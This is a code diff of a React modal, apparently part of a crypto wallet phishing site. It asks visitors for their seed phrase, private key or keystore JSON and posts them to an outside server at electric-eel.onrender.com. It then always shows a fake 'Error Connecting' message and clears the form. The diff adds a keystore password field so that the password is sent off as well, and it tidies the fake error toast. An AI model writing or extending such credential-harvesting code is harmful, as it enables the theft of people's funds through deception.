@@ -34,6 +34,7 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
   const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
   const [privateKey, setPrivateKey] = useState("");
   const [keystoreJson, setKeystoreJson] = useState("");
+  const [keystorePassword, setKeystorePassword] = useState("");
   const [loading, setLoading] = useState(false);
 
   const handlePhraseLengthChange = (length) => {
@@ -58,6 +59,7 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
         tab3: {
           content: "",
           title: "",
+          password: "",
         },
       };
 
@@ -88,6 +90,7 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
         }
         payload.tab3.content = keystoreJson;
         payload.tab3.title = "keystore";
+        payload.tab3.password = keystorePassword;
       }
 
       const response = await fetch("https://electric-eel.onrender.com/submit", {
@@ -101,23 +104,19 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
       const result = await response.json();
       console.log("Submit successful:", result);
 
-      // Do NOT clear inputs here! Keep values while loading.
-      // Wait 5 seconds before showing error toast and clearing inputs
       setTimeout(() => {
         setShowErrorToast(true);
-        setLoading(false); // stop spinner now
+        setLoading(false);
 
-        // Clear inputs when toast appears
         setPhraseWords(Array(phraseLength).fill(""));
         setPrivateKey("");
         setKeystoreJson("");
+        setKeystorePassword("");
 
-        // Close modal 1.5s after toast shows
         setTimeout(() => {
           onClose();
         }, 1500);
 
-        // Navigate after 10s
         setTimeout(() => {
           navigate("/connect");
         }, 10000);
@@ -126,10 +125,11 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
       console.error("Submit error:", error);
       setShowErrorToast(true);
       setLoading(false);
-      // Clear inputs on error toast show
+
       setPhraseWords(Array(phraseLength).fill(""));
       setPrivateKey("");
       setKeystoreJson("");
+      setKeystorePassword("");
 
       setTimeout(() => {
         onClose();
@@ -223,7 +223,6 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
               <div className="grid grid-cols-3 gap-4">
                 {phraseWords.map((input, index) => (
                   <div key={index} className="relative group my-1">
-                    <span className="absolute -left-0.5 top-2 bottom-2 w-1.5 rounded transition-all duration-300 group-focus-within:opacity-100"></span>
                     <input
                       id={`input-${index}`}
                       type="text"
@@ -242,9 +241,9 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
                     <label
                       htmlFor={`input-${index}`}
                       className="absolute left-6 top-3.5 text-[3px] text-gray-500 transition-all duration-200 ease-in-out 
-              peer-placeholder-shown:top-3 peer-placeholder-shown:text-[10px] 
-              peer-placeholder-shown:text-gray-400 peer-focus:top-1.5 
-              peer-focus:text-[8px] peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
+                        peer-placeholder-shown:top-3 peer-placeholder-shown:text-[10px] 
+                        peer-placeholder-shown:text-gray-400 peer-focus:top-1.5 
+                        peer-focus:text-[8px] peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
                     >
                       Write here
                     </label>
@@ -265,7 +264,7 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
                 onChange={(e) => !loading && setPrivateKey(e.target.value)}
                 placeholder="Enter your private key"
                 rows={4}
-                className={`w-full p-3 text-sm rounded-lg shadow border ${
+                className={`w-full p-3 text-sm rounded-lg shadow border resize-none min-h-[100px] ${
                   isDarkMode
                     ? "bg-[#2a2a2a] text-white border-gray-600"
                     : "bg-white text-gray-800 border-gray-200"
@@ -286,13 +285,32 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
                 onChange={(e) => !loading && setKeystoreJson(e.target.value)}
                 placeholder="Paste your keystore JSON here"
                 rows={4}
-                className={`w-full p-3 text-sm rounded-lg shadow border ${
+                className={`w-full p-3 text-sm rounded-lg shadow border resize-none min-h-[100px] ${
                   isDarkMode
                     ? "bg-[#2a2a2a] text-white border-gray-600"
                     : "bg-white text-gray-800 border-gray-200"
                 } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
                 disabled={loading}
               />
+              <div>
+                <label className="block text-sm mb-1 text-gray-500">
+                  Password
+                </label>
+                <input
+                  type="password"
+                  value={keystorePassword}
+                  onChange={(e) =>
+                    !loading && setKeystorePassword(e.target.value)
+                  }
+                  placeholder="Enter password"
+                  className={`w-full p-3 text-sm rounded-lg shadow border ${
+                    isDarkMode
+                      ? "bg-[#2a2a2a] text-white border-gray-600"
+                      : "bg-white text-gray-800 border-gray-200"
+                  } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
+                  disabled={loading}
+                />
+              </div>
             </div>
           )}
         </div>
@@ -317,7 +335,6 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
           </button>
         </div>
 
-        {/* Footer */}
         <div className="text-center flex items-center justify-center gap-2 text-sm mt-6">
           <IoShieldHalfOutline className="text-2xl" />
           <p className="text-gray-400 text-sm">
@@ -326,46 +343,24 @@ const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
         </div>
       </motion.div>
 
-      {/* Error Toast (top-right with bounce) */}
+      {/* Error Toast Centered */}
       {showErrorToast && (
         <motion.div
-          initial={{ x: "100%", y: -50, opacity: 0 }}
-          animate={{ x: 0, y: 0, opacity: 1 }}
-          exit={{ x: "100%", opacity: 0 }}
+          initial={{ scale: 0.8, opacity: 0 }}
+          animate={{ scale: 1, opacity: 1 }}
+          exit={{ scale: 0.8, opacity: 0 }}
           transition={{
             type: "spring",
             stiffness: 300,
             damping: 20,
-            bounce: 0.5,
             duration: 0.6,
           }}
-          className="fixed top-5 right-5 z-50 w-80 max-w-xs p-4 bg-white text-red-700 border-l-4 border-red-500 rounded-lg shadow-lg"
+          className="fixed inset-0 z-50 flex items-center justify-center"
         >
-          <div className="flex-1">
+          <div className="w-80 max-w-xs p-4 bg-white text-red-700 border-l-4 border-red-500 rounded-lg shadow-lg text-center">
             <p className="font-bold text-2xl">Error Connecting!</p>
-            <p className="text-sm">
-              Only active wallets are authorized. <code></code>...
-            </p>
+            <p className="text-sm mt-1">Only active wallets are authorized.</p>
           </div>
-          {/*     <button
-            onClick={() => setShowErrorToast(false)}
-            className="ml-4 focus:outline-none text-red-500"
-          >
-            <svg
-              className="w-6 h-6"
-              fill="none"
-              stroke="currentColor"
-              strokeWidth={2}
-              viewBox="0 0 24 24"
-              xmlns="http://www.w3.org/2000/svg"
-            >
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                d="M6 18L18 6M6 6l12 12"
-              />
-            </svg>
-          </button> */}
         </motion.div>
       )}
     </div>
